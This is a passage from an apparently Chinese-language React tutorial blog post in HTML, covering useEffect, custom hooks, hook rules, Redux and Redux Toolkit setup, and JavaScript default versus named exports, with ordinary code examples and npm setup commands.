src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.53.00.png" style="zoom:50%;"><h1 id="十二、useEffect"><a href="#十二、useEffect" class="headerlink" title="十二、useEffect"></a>十二、useEffect</h1><h2 id="12-1-useEffect-的概念理解"><a href="#12-1-useEffect-的概念理解" class="headerlink" title="12.1 useEffect 的概念理解"></a>12.1 useEffect 的概念理解</h2><p>useEffect是一个React Hook函数，用于在React组件中创建不是由事件引起而是由渲染本身引起的操作（副作用）, 比如发送AJAX请求，更改DOM等等。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-27%2015.50.30.png" style="zoom:50%;"><p>说明：上面的组件中没有发生任何的用户事件，组件渲染完毕之后就需要和服务器要数据，整个过程属于“只由渲染引起的操作”。</p><h2 id="12-2-useEffect-的基础使用"><a href="#12-2-useEffect-的基础使用" class="headerlink" title="12.2 useEffect 的基础使用"></a>12.2 useEffect 的基础使用</h2><p>需求：在组件渲染完毕之后，立刻从服务端获取频道列表数据并显示到页面中。</p><p>语法：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-27%2015.51.20.png" style="zoom:50%;"><p>参数1是一个函数，可以把它叫做副作用函数，在函数内部可以放置要执行的操作。</p><p>参数2是一个数组（可选参），在数组里放置依赖项，不同依赖项会影响第一个参数函数的执行，当是一个空数组的时候，副作用函数只会在组件渲染完毕之后执行一次。</p><p>接口地址：<a href="http://geek.itheima.net/v1_0/channels">http://geek.itheima.net/v1_0/channels</a></p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">const</span> <span class="token constant">URL</span> <span class="token operator">=</span> <span class="token string">'http://geek.itheima.net/v1_0/channels'</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 创建一个状态数据</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>list<span class="token punctuation">,</span> setList<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token comment">// 额外的操作 获取频道列表</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getList</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> jsonRes <span class="token operator">=</span> <span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jsonRes<span class="token punctuation">)</span>      <span class="token function">setList</span><span class="token punctuation">(</span>jsonRes<span class="token punctuation">.</span>data<span class="token punctuation">.</span>channels<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is app      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-3-useEffect-依赖项参数说明"><a href="#12-3-useEffect-依赖项参数说明" class="headerlink" title="12.3 useEffect 依赖项参数说明"></a>12.3 useEffect 依赖项参数说明</h2><p>useEffect副作用函数的执行时机存在多种情况，根据传入依赖项的不同，会有不同的执行表现:</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2016.35.58.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. 没有依赖项  初始 + 组件更新(例如状态变量更新)</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">// useEffect(() =&gt; {</span>  <span class="token comment">//   console.log('副作用函数执行了')</span>  <span class="token comment">// })</span>  <span class="token comment">// 2. 传入空数组依赖  初始执行一次</span>  <span class="token comment">// useEffect(() =&gt; {</span>  <span class="token comment">//   console.log('副作用函数执行了')</span>  <span class="token comment">// }, [])</span>  <span class="token comment">// 3. 传入特定依赖项  初始 + 依赖项变化时执行</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'副作用函数执行了'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is app      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">+</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-4-清除副作用"><a href="#12-4-清除副作用" class="headerlink" title="12.4 清除副作用"></a>12.4 清除副作用</h2><p>在useEffect中编写的由渲染本身引起的对接组件外部的操作，社区也经常把它叫做副作用操作，比如在useEffect中开启了一个定时器，我们想在组件卸载时把这个定时器再清理掉，这个过程就是清理副作用。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2016.45.35.png" style="zoom:50%;"><ul><li><p>说明：清除副作用的函数最常见的执行时机是在组件卸载时自动执行。 </p></li><li><p>需求：在Son组件渲染时开启一个定制器，卸载时清除这个定时器。</p></li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. 渲染时开启一个定时器</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'定时器执行中...'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>      <span class="token comment">// 清除副作用(组件卸载时)</span>      <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is son</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 通过条件渲染模拟组件卸载</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>show<span class="token punctuation">,</span> setShow<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>show <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span> <span class="token punctuation">/&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setShow</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">卸载Son组件</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="十三、自定义Hook函数"><a href="#十三、自定义Hook函数" class="headerlink" title="十三、自定义Hook函数"></a>十三、自定义Hook函数</h1><h2 id="13-1-自定义Hook函数基础用法"><a href="#13-1-自定义Hook函数基础用法" class="headerlink" title="13.1 自定义Hook函数基础用法"></a>13.1 自定义Hook函数基础用法</h2><p>概念：自定义Hook是以 use 打头的函数，通过自定义Hook函数可以用来实现逻辑的封装和复用。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2017.10.41.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 封装自定义Hook</span><span class="token comment">// 问题: 布尔切换的逻辑 当前组件耦合在一起的 不方便复用</span><span class="token comment">// 解决思路: 自定义hook</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">useToggle</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 可复用的逻辑代码</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">toggle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">)</span>  <span class="token comment">// 哪些状态和回调函数需要在其他组件中使用 return</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    value<span class="token punctuation">,</span>    toggle  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 封装自定义hook通用思路</span><span class="token comment">// 1. 声明一个以use打头的函数</span><span class="token comment">// 2. 在函数体内封装可复用的逻辑（只要是可复用的逻辑）</span><span class="token comment">// 3. 把组件中用到的状态或者回调return出去（以对象或者数组）</span><span class="token comment">// 4. 在哪个组件中要用到这个逻辑，就执行这个函数，解构出来状态和回调进行使用</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> value<span class="token punctuation">,</span> toggle <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>value <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is div</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>toggle<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">toggle</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-2-ReactHooks使用规则"><a href="#13-2-ReactHooks使用规则" class="headerlink" title="13.2 ReactHooks使用规则"></a>13.2 ReactHooks使用规则</h2><p>使用规则</p><ol><li>只能在组件中或者其他自定义Hook函数中调用。</li><li>只能在组件的顶层调用，不能嵌套在 if、for、其他函数中。</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2017.22.18.png" style="zoom:67%;"><h1 id="十四、Redux-React"><a href="#十四、Redux-React" class="headerlink" title="十四、Redux+React"></a>十四、Redux+React</h1><h2 id="14-1-Redux快速上手"><a href="#14-1-Redux快速上手" class="headerlink" title="14.1 Redux快速上手"></a>14.1 Redux快速上手</h2><h3 id="14-1-1-什么是Redux？"><a href="#14-1-1-什么是Redux？" class="headerlink" title="14.1.1 什么是Redux？"></a>14.1.1 什么是Redux？</h3><p>Redux 是React最常用的集中状态管理工具，类似于Vue中的Pinia（Vuex），可以独立于框架运行。</p><p>作用：通过集中管理的方式管理应用的状态。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.04.23.png" style="zoom:50%;"><h3 id="14-1-2-Redux快速体验"><a href="#14-1-2-Redux快速体验" class="headerlink" title="14.1.2 Redux快速体验"></a>14.1.2 Redux快速体验</h3><p>不和任何框架绑定，不使用任何构建工具，使用纯Redux实现计数器。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.05.47.png" style="zoom:50%;"><p>使用步骤：</p><ol><li>定义一个 reducer 函数 （根据当前想要做的修改返回一个新的状态）。</li><li>使用createStore方法传入 reducer函数 生成一个store实例对象。</li><li>使用store实例的 subscribe方法 订阅数据的变化（数据一旦变化，可以得到通知）。</li><li>使用store实例的 dispatch方法提交action对象触发数据变化（告诉reducer你想怎么改数据）。</li><li>使用store实例的 getState方法 获取最新的状态数据更新到视图中。</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>decrement<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">-</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">0</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>increment<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/redux@latest/dist/redux.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">  // 1. 定义reducer函数   // 作用: 根据不同的action对象，返回不同的新的state  // state: 管理的数据初始状态  // action: 对象 type 标记当前想要做什么样的修改  function reducer (state = { count: 0 }, action) {    // 数据不可变：基于原始状态生成一个新的状态    if (action.type === 'INCREMENT') {      return { count: state.count + 1 }    }    if (action.type === 'DECREMENT') {      return { count: state.count - 1 }    }    return state  }  // 2. 使用reducer函数生成store实例  const store = Redux.createStore(reducer)  // 3. 通过store实例的subscribe订阅数据变化  // 回调函数可以在每次state发生变化的时候自动执行  store.subscribe(() =&gt; {    console.log('state变化了', store.getState())    document.getElementById('count').innerText = store.getState().count  })  // 4. 通过store实例的dispatch函数提交action更改状态   const inBtn = document.getElementById('increment')  inBtn.addEventListener('click', () =&gt; {    // 增    store.dispatch({      type: 'INCREMENT'    })  })  const dBtn = document.getElementById('decrement')  dBtn.addEventListener('click', () =&gt; {    // 减    store.dispatch({      type: 'DECREMENT'    })  })  // 5. 通过store实例的getState方法获取最新状态更新到视图中</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="14-1-3-Redux管理数据流程梳理"><a href="#14-1-3-Redux管理数据流程梳理" class="headerlink" title="14.1.3 Redux管理数据流程梳理"></a>14.1.3 Redux管理数据流程梳理</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.26.50.png" style="zoom:50%;"><p>为了职责清晰，数据流向明确，Redux把整个数据修改的流程分成了三个核心概念，分别是：state、action和reducer</p><ol><li>state - 一个对象 存放着我们管理的数据状态。</li><li>action - 一个对象 用来描述你想怎么改数据。</li><li>reducer - 一个函数 根据action的描述生成一个新的state。</li></ol><h2 id="14-2-Redux与React"><a href="#14-2-Redux与React" class="headerlink" title="14.2 Redux与React"></a>14.2 Redux与React</h2><h3 id="14-2-1-环境准备"><a href="#14-2-1-环境准备" class="headerlink" title="14.2.1 环境准备"></a>14.2.1 环境准备</h3><h4 id="1）配套工具"><a href="#1）配套工具" class="headerlink" title="1）配套工具"></a>1）配套工具</h4><p>在React中使用redux，官方要求安装俩个其他插件 - Redux Toolkit 和 react-redux</p><ol><li>Redux Toolkit（RTK）- 官方推荐编写Redux逻辑的方式，是一套工具的集合集，简化书写方式。</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.33.28.png" style="zoom:50%;"><ol start="2"><li>react-redux - 用来 链接 Redux 和 React组件 的中间件。</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.33.48.png" style="zoom:50%;"><h4 id="2）配置基础环境"><a href="#2）配置基础环境" class="headerlink" title="2）配置基础环境"></a>2）配置基础环境</h4><ul><li>使用 CRA 快速创建 React 项目</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-redux-pro<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="大战bug-「npx-create-react-app-项目极慢」"><a href="#大战bug-「npx-create-react-app-项目极慢」" class="headerlink" title="大战bug-「npx create-react-app 项目极慢」"></a>大战bug-「npx create-react-app 项目极慢」</h3><p>更新源：npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com</a></p><p># 查看修改的结果</p><p> npm config get registry</p></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.02.58.png" style="zoom:40%;"><ul><li>cd到项目目录中，安装依赖：</li></ul><p>安装配套工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i @reduxjs/toolkit  react-redux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.05.01.png" style="zoom:50%;"><ul><li>启动项目</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="大战bug-「npm-run-start-启动失败」"><a href="#大战bug-「npm-run-start-启动失败」" class="headerlink" title="大战bug-「npm run start 启动失败」"></a>大战bug-「npm run start 启动失败」</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.06.12.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> ajv@latest ajv-keywords@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>成功启动项目：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.08.03.png" style="zoom:50%;"><h4 id="3）store目录结构设计"><a href="#3）store目录结构设计" class="headerlink" title="3）store目录结构设计"></a>3）store目录结构设计</h4><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.10.12.png" style="zoom:50%;"><ol><li>通常集中状态管理的部分都会单独创建一个单独的 <code>store</code> 目录。</li><li>应用通常会有很多个子store模块，所以创建一个 <code>modules</code> 目录，在内部编写业务分类的子store。</li><li>store中的入口文件 index.js 的作用是组合modules中所有的子模块，并导出store。</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.13.13.png" style="zoom:50%;"><h3 id="14-2-2-Redux与React-实现counter"><a href="#14-2-2-Redux与React-实现counter" class="headerlink" title="14.2.2 Redux与React - 实现counter"></a>14.2.2 Redux与React - 实现counter</h3><h4 id="1）整体路径"><a href="#1）整体路径" class="headerlink" title="1）整体路径"></a>1）整体路径</h4><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.22.35.png" style="zoom:30%;"><h4 id="2）步骤"><a href="#2）步骤" class="headerlink" title="2）步骤"></a>2）步骤</h4><ul><li>1）使用React Toolkit 创建 counterStore</li></ul><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.28.08.png" style="zoom:100%;"><blockquote><h3 id="默认导出和命名导出"><a href="#默认导出和命名导出" class="headerlink" title="默认导出和命名导出"></a>默认导出和命名导出</h3><p>在 JavaScript 的模块系统中，导出（export）和导入（import）允许你将代码分割成不同的模块，然后在需要的地方重用它们。模块可以有命名导出（named exports）和默认导出（default export）。</p><ul><li>默认导出（Default Export）</li></ul><p>默认导出是模块的主要内容或最常用的部分。一个模块只能有一个默认导出。默认导出可以用任何有效的标识符命名，当导入时，你可以使用任何名称来引用它。</p><p><strong>示例：默认导出</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// module.js</span><span class="token keyword">const</span> <span class="token function-variable function">someFunction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This is a function from a module.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> someFunction<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>导入默认导出</strong></p><p>javascript</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// anotherFile.js</span><span class="token keyword">import</span> myFunction <span class="token keyword">from</span> 